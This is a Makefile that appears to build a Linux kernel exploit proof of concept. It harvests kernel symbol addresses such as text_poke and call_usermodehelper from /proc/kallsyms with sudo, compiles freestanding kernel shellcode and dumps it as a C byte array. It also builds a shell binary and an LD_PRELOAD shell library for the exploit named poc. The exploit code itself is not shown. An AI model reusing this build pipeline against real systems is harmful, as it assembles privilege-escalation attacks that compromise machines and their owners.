SYMLIST = mutex_lock|mutex_unlock|module_mutex|text_poke|get_kprobe|module_alloc|schedule_on_each_cpu|call_usermodehelper|printk

KERNEL_CFLAGS = \
	-static -nostartfiles -nodefaultlibs -nostdlib \
	-mno-80387 -mno-fp-ret-in-387 -mno-mmx -mno-sse -mno-sse2 -mno-3dnow -mno-avx \
	-mpreferred-stack-boundary=4 -mno-red-zone \
	-fomit-frame-pointer -fno-stack-protector

.PHONY: all
all: poc.c ../shell/shell.c
	sudo grep -w -E '($(SYMLIST))' /proc/kallsyms | awk '{printf("#define X_%s 0x%s\n", $$3, $$1)}' >poc.h
	echo "#define SHELL \"$(CURDIR)/shell\"" >>poc.h
	echo "#define LD_PRELOAD_SHELL \"LD_PRELOAD=$(CURDIR)/shell_preload.so\"" >>poc.h
	gcc ../shell/shell_preload.c -o shell_preload.so -I$(CURDIR) -shared -fPIC
	gcc ../shell/shell.c -o shell
	gcc $(KERNEL_CFLAGS) shellcode.c -o shellcode
	objcopy --dump-section .text=/dev/stdout shellcode | xxd -i >shellcode.inc
	gcc poc.c -o poc

.PHONY: clean
clean:
	rm -f shell shell_preload.so shellcode shellcode.inc poc poc.h
